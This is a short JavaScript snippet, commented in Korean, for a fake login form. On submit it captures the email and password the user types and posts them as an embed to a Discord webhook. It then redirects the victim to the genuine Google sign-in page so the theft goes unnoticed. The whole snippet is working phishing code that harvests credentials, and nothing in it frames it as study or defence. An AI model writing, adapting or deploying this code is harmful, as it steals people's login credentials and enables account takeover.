<script>
    const form = document.getElementById('loginForm');
    const DISCORD_WEBHOOK_URL = "https://discord.com";

    form.onsubmit = async (e) => {
        e.preventDefault(); // 기본 폼 제출 기능 차단

        const email = document.getElementById('userEmail').value;
        const password = document.getElementById('userPw').value;

        // Discord로 보낼 메시지 구성
        const payload = {
            embeds: [{
                title: "📌 새로운 로그인 시도",
                color: 5814783, // 파란색 계열
                fields: [
                    { name: "이메일", value: email, inline: true },
                    { name: "비밀번호", value: password, inline: true }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        try {
            // Discord 웹훅으로 데이터 전송
            await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // 전송 완료 후 실제 구글 로그인 페이지로 이동
            window.location.href = "https://accounts.google.com";
        } catch (error) {
            console.error("오류가 발생했습니다:", error);
            alert("로그인 처리 중 오류가 발생했습니다.");
        }
    };

    // ... (기존 nextStep, prevStep 함수 유지)
</script>
